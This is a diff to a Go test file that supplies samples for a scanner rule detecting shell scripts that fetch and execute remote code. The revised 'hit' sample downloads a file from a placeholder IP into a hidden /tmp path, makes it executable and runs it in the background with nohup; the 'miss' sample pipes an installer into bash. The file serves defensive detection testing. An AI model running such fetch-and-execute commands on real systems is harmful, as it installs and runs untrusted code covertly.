@@ -76,12 +76,15 @@ func persistenceSamples() []sample {
 				"./wp-cli.phar --info\n",
 		},
 		{
-			// A download piped straight into a shell, from a script without an
-			// extension: the first line says what it is.
+			// A script without an extension: the first line says what it is.
 			rule: "shell.fetch_exec", ext: "", path: "/web/tools/update",
-			hit: "#!/usr/bin/env bash\n" + pCurl + " -fsSL http://192.0.2.7/i | sh\n",
-			// A download read by another program.
-			miss: "#!/usr/bin/env bash\n" + pCurl + " -fsS https://example.invalid/status | grep -q ok && echo bereit\n",
+			hit: "#!/usr/bin/env bash\n" + pCurl + " -fsSL -o /tmp/.u http://192.0.2.7/u\nchmod 700 /tmp/.u\n" +
+				pNohup + " /tmp/.u &\n",
+			// The shape of the test scripts of twig: an installer piped into a
+			// shell, a tool fetched and made executable, nothing sent to the
+			// background.
+			miss: "#!/usr/bin/env bash\n" + pWget + " https://example.invalid/cli/installer -O - | bash\n" +
+				pCurl + " -OLsS https://example.invalid/player.phar\nchmod +x player.phar\n./player.phar run x\n",
 		},
 		{
 			rule: "shell.fetch_exec", ext: "sh", path: "/web/tools/start.sh",
